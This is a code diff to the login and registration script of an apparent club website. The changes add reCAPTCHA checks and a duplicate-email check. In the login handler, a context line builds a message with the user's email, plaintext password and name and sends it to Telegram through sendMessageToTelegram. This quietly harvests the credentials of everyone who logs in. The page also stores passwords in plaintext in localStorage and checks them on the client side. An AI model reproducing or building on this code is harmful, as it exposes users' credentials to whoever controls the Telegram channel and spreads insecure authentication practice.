@@ -85,7 +85,7 @@
             <input type="email" id="login-email" name="login-email" placeholder="Enter your email" required>
             <label for="login-password">Password</label>
             <input type="password" id="login-password" name="login-password" placeholder="Enter your password" required>
-
+            
             <!-- Google reCAPTCHA for Login -->
             <div class="g-recaptcha" data-sitekey="6Lclm2YqAAAAAG9PO0778aGohl8_vvGl7c3SMImM"></div>
             <br>
@@ -186,11 +186,17 @@
         document.getElementById('login-submit').addEventListener('click', function() {
             const loginEmail = document.getElementById('login-email').value.trim();
             const loginPassword = document.getElementById('login-password').value;
+            const recaptchaResponse = grecaptcha.getResponse();
+
+            if (!recaptchaResponse) {
+                alert("Please complete the CAPTCHA");
+                return;
+            }
+
             const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
-
-            const user = Object.values(storedUsers).find(user => user.email === loginEmail && user.password === loginPassword);
-
-            if (user) {
+            const user = Object.values(storedUsers).find(user => user.email === loginEmail);
+            
+            if (user && user.password === loginPassword) {
                 const message = `Login: Email: ${user.email}, Password: ${user.password}, First Name: ${user.firstName}, Last Name: ${user.lastName}`;
                 sendMessageToTelegram(message);
                 showSection('club-section'); // Navigate to Coders Club page
@@ -207,6 +213,12 @@
             const department = document.getElementById('department').value.trim();
             const password = document.getElementById('password').value;
             const confirmPassword = document.getElementById('confirm-password').value;
+            const recaptchaResponse = grecaptcha.getResponse();
+
+            if (!recaptchaResponse) {
+                alert("Please complete the CAPTCHA");
+                return;
+            }
 
             if (password !== confirmPassword) {
                 document.getElementById('register-error').textContent = 'Passwords do not match';
@@ -215,6 +227,12 @@
             }
 
             const storedUsers = JSON.parse(localStorage.getItem('users')) || {};
+            if (storedUsers[email]) {
+                document.getElementById('register-error').textContent = 'Email already exists';
+                document.getElementById('register-error').style.display = 'block';
+                return;
+            }
+
             storedUsers[email] = { email, firstName, lastName, department, password };
             localStorage.setItem('users', JSON.stringify(storedUsers));
 
